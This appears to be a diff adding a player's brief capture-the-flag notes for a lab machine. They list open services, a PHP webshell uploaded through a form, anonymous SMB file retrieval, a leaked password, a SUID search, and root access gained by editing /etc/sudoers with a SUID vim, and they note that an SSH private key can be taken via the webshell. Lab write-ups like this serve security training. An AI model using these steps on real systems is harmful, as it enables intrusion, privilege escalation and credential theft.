@@ -1,0 +1,42 @@
+Tyler:
+22 (OpenSSH 7.4)
+narrator:X8JEETQmf3hkS65f
+991c65538b9afaf2494f4552b915c948
+80 (Apache 2.4.6)
+/upload is an upload form
+allows me to upload php and jpeg, returns “:)”
+/betatest/
+flag in php code: 562216ebd6128e6e3ea13dbe6bcaf46a
+webshell
+;ls
+139 (Samba 3.X - 4.X)
+445 (Samba 3.X - 4.X)
+smbclient \\\\10.10.101.122\\public 
+dir
+get flag.txt
+2308b0cccea3f2a187a89a9f3155a3a4
+get alert.txt
+Let's keep things interesting... X8JEETQmf3hkS65f
+narrator password above
+3306 (MariaDB)
+5000 (Werkzeug 1.0.0)
+file upload form
+Allowed file types are txt, pdf, png, jpg, jpeg, gif, py
+runs python files
+8080 (nginx 1.16.1)
+Priv Esc
+find / -perm -4000 2>/dev/null
+/usr/bin/vim
+vim /etc/sudoers
+narrator ALL=(ALL) NOPASSWD:ALL
+sudo -i
+root
+9a2d57cc33cd052a88fd5ba25d1c953c
+/usr/bin/staprun
+Other Things
+cat /centos_chroot/root/flag.txt
+89ce3ba14a7d1f01f32b53dc75290b4b
+cat /home/tdurden/user.txt
+751ad4b411730e6596d0cc4ae9245106
+/home/tdurden/.ssh/id_rsa is private key
+can be obtained from the /betatest webshell and used to ssh in as an alternative to narrator
